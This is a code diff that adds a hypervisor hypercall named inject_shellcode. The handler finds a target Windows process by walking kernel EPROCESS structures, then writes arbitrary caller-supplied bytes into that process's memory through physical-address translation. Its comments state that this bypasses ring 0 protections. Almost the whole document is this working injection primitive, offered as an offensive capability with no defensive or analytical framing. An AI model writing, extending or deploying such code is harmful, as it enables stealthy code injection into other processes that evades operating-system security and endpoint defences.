@@ -598,5 +598,120 @@ void remove_all_mmrs(vcpu* const cpu) {
   skip_instruction();
 }
 
+// inject shellcode into a remote process via ring -1
+// RCX = target PID
+// RDX = target virtual address (in target process)
+// R8  = source buffer (in caller's address space)
+// R9  = size
+// Returns: bytes written in RAX
+void inject_shellcode(vcpu* const cpu) {
+  auto const ctx = cpu->ctx;
+
+  // arguments
+  auto const target_pid = ctx->rcx;
+  auto const dst = reinterpret_cast<uint8_t*>(ctx->rdx);
+  auto const src = reinterpret_cast<uint8_t*>(ctx->r8);
+  auto const size = ctx->r9;
+
+  ctx->rax = 0;
+
+  // Step 1: Get the target process CR3
+  cr3 guest_cr3;
+
+  // System process (PID 4)
+  if (target_pid == 4) {
+    guest_cr3 = ghv.system_cr3;
+  } else {
+    // Walk ActiveProcessLinks to find the target process
+    auto const apl_offset = ghv.eprocess_unique_process_id_offset + 8;
+    auto const head = ghv.system_eprocess + apl_offset;
+    auto curr_entry = head;
+    bool found = false;
+
+    do {
+      // get the next entry in the linked list
+      if (sizeof(curr_entry) != read_guest_virtual_memory(ghv.system_cr3,
+          curr_entry + offsetof(LIST_ENTRY, Flink), &curr_entry, sizeof(curr_entry)))
+        break;
+
+      // EPROCESS
+      auto const process = curr_entry - apl_offset;
+
+      // EPROCESS::UniqueProcessId
+      uint64_t pid = 0;
+      if (sizeof(pid) != read_guest_virtual_memory(ghv.system_cr3,
+          process + ghv.eprocess_unique_process_id_offset, &pid, sizeof(pid)))
+        break;
+
+      // we found the target process
+      if (target_pid == pid) {
+        // EPROCESS::DirectoryTableBase
+        uint64_t cr3_val = 0;
+        if (sizeof(cr3_val) != read_guest_virtual_memory(ghv.system_cr3,
+            process + ghv.kprocess_directory_table_base_offset, &cr3_val, sizeof(cr3_val)))
+          break;
+
+        guest_cr3.flags = cr3_val;
+        found = true;
+        break;
+      }
+    } while (curr_entry != head);
+
+    if (!found) {
+      // Target process not found
+      skip_instruction();
+      return;
+    }
+  }
+
+  // Step 2: Write shellcode to target process via physical memory
+  // This bypasses all ring 0 protections (copy-on-write, page guards, etc.)
+  size_t bytes_written = 0;
+
+  while (bytes_written < size) {
+    size_t dst_remaining = 0, src_remaining = 0;
+
+    // translate the target virtual address to host virtual address
+    auto const curr_dst = gva2hva(guest_cr3, dst + bytes_written, &dst_remaining);
+    // translate the source buffer (caller's address space)
+    auto const curr_src = gva2hva(src + bytes_written, &src_remaining);
+
+    if (!curr_src) {
+      // guest virtual address that caused the fault
+      ctx->cr2 = reinterpret_cast<uint64_t>(src + bytes_written);
+
+      page_fault_exception error;
+      error.flags = 0;
+      error.present = 0;
+      error.write = 0;
+      error.user_mode_access = (current_guest_cpl() == 3);
+
+      inject_hw_exception(page_fault, error.flags);
+      return;
+    }
+
+    // target memory not paged in - we can't do anything about this
+    // from ring -1 without being in the process context
+    if (!curr_dst)
+      break;
+
+    // write as much as we can with the translated HVAs
+    auto const curr_size = min(size - bytes_written, min(dst_remaining, src_remaining));
+
+    host_exception_info e;
+    memcpy_safe(e, curr_dst, curr_src, curr_size);
+
+    if (e.exception_occurred) {
+      inject_hw_exception(general_protection, 0);
+      return;
+    }
+
+    bytes_written += curr_size;
+  }
+
+  ctx->rax = bytes_written;
+  skip_instruction();
+}
+
 } // namespace hv::hc
 
